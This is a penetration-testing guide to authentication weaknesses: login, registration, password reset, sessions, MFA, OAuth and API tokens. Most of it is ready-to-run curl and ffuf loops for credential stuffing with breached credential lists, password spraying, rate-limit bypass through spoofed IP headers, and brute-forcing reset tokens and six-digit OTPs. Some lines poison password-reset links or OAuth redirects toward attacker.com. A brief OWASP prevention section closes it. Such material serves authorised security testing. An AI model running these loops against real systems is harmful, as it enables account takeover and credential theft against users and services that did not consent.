# Authentication Security Testing

> Comprehensive authentication vulnerability testing for bug bounty hunters and penetration testers. Covers login, registration, password reset, session management, MFA bypass, OAuth/SSO misconfigurations, and 2025‑2026 trends (account takeover, credential stuffing, hybrid attacks).

## Methodology Overview

Authentication verifies user identity. Failures allow unauthorized access, account takeover (ATO), credential stuffing, or bypass. Test these areas:

1. **Login Testing**: Default credentials, weak password policy, username enumeration, rate limiting bypass, "remember me" flaws
2. **Registration Testing**: Over‑privileged signup, weak email/phone verification, disposable email bypass
3. **Password Reset/Recovery**: Token predictability, host header injection, response discrepancy, rate limiting
4. **Session Management**: Cookie attributes, session fixation, logout functionality, timeout issues, token/JWT flaws
5. **MFA/2FA Testing**: Bypass via password‑only fallback, OTP predictability, backup code weaknesses
6. **OAuth/SSO Testing**: Redirect URI validation, state parameter missing, PKCE not enforced
7. **API Authentication**: Token validation missing, Bearer token in query params, mass assignment

## Login Testing

### Default & Weak Credentials

```bash
# Test common default credentials
cat targets.txt | while read url; do
  echo "Testing $url"
  curl -s "$url/login" -X POST -d 'username=admin&password=admin' -H "Content-Type: application/x-www-form-urlencoded" | grep -i "invalid\|error\|success" && echo "Default creds on $url"
done

# Using wordlists
cat targets.txt | while read url; do
  ffuf -u "$url/login" -X POST -d 'username=FUZZ&password=FUZZ' -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -mr "success\|welcome\|dashboard" -fc 401,403
done
```

### Username Enumeration

```bash
# Response difference detection
cat usernames.txt | while read user; do
  curl -s "$url/login" -X POST -d "username=$user&password=wrong" -H "Content-Type: application/x-www-form-urlencoded" -w "%{size_download} %{http_code}" -o /dev/null | awk -v u="$user" '{print u " " $1 " " $2}'
done | sort -k2 -n

# Timing attack detection (requires measurement)
cat usernames.txt | while read user; do
  start=$(date +%s%N)
  curl -s "$url/login" -X POST -d "username=$user&password=wrong" -o /dev/null
  end=$(date +%s%N)
  echo "$user $((end-start))"
done | sort -k2 -n
```

### Rate Limiting Bypass

```bash
# IP rotation via headers
for i in {1..100}; do
  curl -s "$url/login" -X POST -d 'username=admin&password=test$i' \
    -H "X-Forwarded-For: 192.168.1.$i" \
    -H "X-Real-IP: 10.0.0.$i" \
    -H "X-Client-IP: 172.16.0.$i"
done

# Using proxy list
cat proxies.txt | while read proxy; do
  curl -s --proxy "$proxy" "$url/login" -X POST -d 'username=admin&password=password'
done
```

### Credential Stuffing

```bash
# Using haveibeenpwned-style lists
while read cred; do
  username=$(echo $cred | cut -d: -f1)
  password=$(echo $cred | cut -d: -f2)
  curl -s "$url/login" -X POST -d "username=$username&password=$password" | grep -q "dashboard\|welcome" && echo "VALID: $username:$password"
done < breached_creds.txt

# Hybrid password spraying (increment patterns)
for user in $(cat users.txt); do
  for year in {2020..2026}; do
    curl -s "$url/login" -X POST -d "username=$user&password=Spring$year!" | grep -q "success" && echo "Found: $user:Spring$year!"
  done
done
```

## Registration Testing

### Over‑privileged Signup

```bash
# Mass assignment testing
curl -X POST "$url/register" -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test123","role":"admin","isAdmin":true,"access_level":999}'

# Parameter fuzzing
ffuf -u "$url/register" -X POST -H "Content-Type: application/json" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -d '{"FUZZ":"admin","email":"test@test.com","password":"test123"}' \
  -mr "success\|created" -fc 400
```

### Weak Email Verification

```bash
# Predictable verification tokens
for i in {1..1000}; do
  token=$(echo -n "$i$email" | md5sum | cut -d' ' -f1)
  curl -s "$url/verify/$token" | grep -q "verified\|success" && echo "Token $i works: $token"
done

# Reusable token test
token=$(curl -s "$url/register" -X POST -d 'email=test1@test.com' | grep -oE 'token=[a-f0-9]+' | cut -d= -f2)
curl -s "$url/verify/$token?email=test2@test.com"  # Try with different email
```

## Password Reset Testing

### Token Predictability & Weakness

```bash
# Sequential token brute-force
for i in {100000..999999}; do
  curl -s "$url/reset?token=$i" | grep -q "reset.*form\|password.*new" && echo "Valid token: $i"
done

# Time-based tokens
for offset in {-10..10}; do
  token=$(date -d "$offset minutes" +%Y%m%d%H%M%S | md5sum | cut -d' ' -f1)
  curl -s "$url/reset?token=$token" | grep -q "valid\|expired" && echo "Time-based token offset $offset: $token"
done
```

### Host Header Injection

```bash
# Poison reset link
curl -X POST "$url/reset" -H "Host: attacker.com" \
  -d 'email=victim@example.com'

# Open redirect in reset link
curl -s "$url/reset?token=abc&next=https://attacker.com/capture" | grep -q "redirect\|Location"
```

### Response Discrepancy & Enumeration

```bash
# User enumeration via reset
cat emails.txt | while read email; do
  response=$(curl -s "$url/reset" -X POST -d "email=$email" -w "%{http_code} %{size_download}")
  echo "$email $response"
done | grep -v "200 1452"  # Different size indicates user exists
```

## Session Management Testing

### Cookie Attributes Check

```bash
# Check Secure, HttpOnly, SameSite flags
curl -s -I "$url/login" | grep -i set-cookie | while read cookie; do
  echo "$url: $cookie" | grep -v "Secure\|HttpOnly\|SameSite" && echo "INSECURE COOKIE on $url"
done

# Session fixation test
curl -c fixated.txt "$url"  # Get session cookie
curl -b fixated.txt "$url/login" -X POST -d 'username=test&password=test'  # Login with same cookie
curl -b fixated.txt "$url/dashboard"  # Check if session upgraded
```

### Logout & Session Invalidation

```bash
# Test logout doesn't invalidate session
curl -c session.txt "$url/login" -X POST -d 'username=test&password=test'
curl -b session.txt "$url/logout"
curl -b session.txt "$url/dashboard"  # Should redirect to login but might work

# Back button after logout
curl -b session.txt -H "Cache-Control: max-age=0" "$url/dashboard"  # Test cache issues
```

## MFA/2FA Bypass Testing

### OTP Predictability & Reuse

```bash
# Test sequential OTPs
for i in {000000..999999}; do
  curl -s "$url/verify-otp" -X POST -d "otp=$i" | grep -q "success\|verified" && echo "Weak OTP: $i"
done

# OTP reuse test
curl -c session1.txt "$url/login" -X POST -d 'username=test&password=test'
otp=$(grep -oE '[0-9]{6}' response1.html)
curl -c session2.txt "$url/verify-otp" -X POST -d "otp=$otp"  # Try same OTP for different session
```

### MFA Bypass via Password-Only Fallback

```bash
# Check if MFA is optional
curl -s "$url/login" -X POST -d 'username=test&password=test&mfa=skip'  # Try skip parameter
curl -s "$url/login" -X POST -d 'username=test&password=test' -H "X-Forwarded-For: 127.0.0.1"  # Localhost bypass

# Backup code weaknesses
for code in 000000 111111 123456 999999; do
  curl -s "$url/use-backup-code" -X POST -d "code=$code" | grep -q "accepted\|valid" && echo "Weak backup code: $code"
done
```

## OAuth/SSO Testing

### Redirect URI Validation

```bash
# Open redirect test
curl -s "$url/oauth/authorize?client_id=test&redirect_uri=https://attacker.com/callback&response_type=code"
curl -s "$url/oauth/authorize?client_id=test&redirect_uri=http://localhost&response_type=code"
curl -s "$url/oauth/authorize?client_id=test&redirect_uri=data:text/html,<script>alert(1)</script>&response_type=code"

# State parameter missing
curl -s "$url/oauth/authorize?client_id=test&redirect_uri=https://client.com/callback&response_type=code" | grep -q "state" || echo "STATE PARAMETER MISSING"
```

### PKCE Enforcement

```bash
# Try without code_challenge
curl -s "$url/oauth/authorize?client_id=test&redirect_uri=https://client.com/callback&response_type=code&code_challenge_method=plain"
curl -s "$url/oauth/token" -X POST -d 'client_id=test&code=abc&grant_type=authorization_code'  # Without code_verifier
```

## API Authentication Testing

### Missing Authentication

```bash
# Test endpoints without auth headers
cat api-endpoints.txt | httpx -silent -mc 200,201,204 -fc 401,403 | anew no-auth-endpoints.txt

# Try common auth bypass headers
cat api-endpoints.txt | while read url; do
  curl -s "$url" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" \
    -H "X-Remote-IP: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1" \
    -H "X-Custom-IP-Authorization: 127.0.0.1" -w "%{http_code} - $url\n" | grep "^200"
done | anew auth-bypass.txt
```

### Token Validation Issues

```bash
# Test with invalid/empty tokens
curl -s "$url/api/user" -H "Authorization: Bearer"
curl -s "$url/api/user" -H "Authorization: Bearer invalid"
curl -s "$url/api/user" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ"  # JWT with alg HS256, secret empty

# Token in URL params (logs leakage)
curl -s "$url/api/user?token=eyJ..." | grep -q "user\|data" && echo "Token accepted in URL"
```

## Tools & Automation

### Burp Suite & Extensions

```bash
# Export targets for Burp
cat targets.txt | awk '{print "https://" $1}' | tee burp-targets.txt
cat targets.txt | awk '{print "http://" $1}' >> burp-targets.txt

# Use Turbo Intruder for rate limit bypass
python3 turbo_intruder.py targets.txt login_requests.txt
```

### Custom Scripts

```bash
# Comprehensive auth test script
#!/bin/bash
URL=$1
echo "Testing authentication on $URL"
# 1. Check default creds
# 2. Test username enumeration
# 3. Test rate limiting
# 4. Check session management
# 5. Test password reset
# 6. Verify MFA bypass
# ... output results
```

## Prevention & Best Practices

From OWASP Top 10 2025 A07: Authentication Failures:

1. **Implement MFA** where possible (blocks 99.9% of account compromises)
2. **Enforce strong password policies** + breached password checks (HaveIBeenPwned)
3. **Implement rate limiting & lockouts** (but avoid DoS scenarios)
4. **Secure cookies** (Secure, HttpOnly, SameSite=Lax/Strict)
5. **Use cryptographically secure tokens** for reset, session, verification
6. **Invalidate sessions** on logout, password change, idle timeout
7. **Avoid information leakage** in responses (use generic error messages)
8. **Validate redirect URIs** in OAuth/SSO flows
9. **Require re‑authentication** for sensitive actions
10. **Use secure frameworks** rather than custom auth implementations

## References

- **OWASP Top 10 2025 A07: Authentication Failures**: https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/
- **OWASP Authentication Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- **PortSwigger Authentication Labs**: https://portswigger.net/web-security/authentication
- **NIST SP800-63B Digital Identity Guidelines**: https://pages.nist.gov/800-63-3/sp800-63b.html
- **HaveIBeenPwned Pwned Passwords**: https://haveibeenpwned.com/Passwords
- **2025‑2026 Trends**: Account takeover via race conditions, MFA bypass via SIM‑swap hints, hybrid credential stuffing attacks


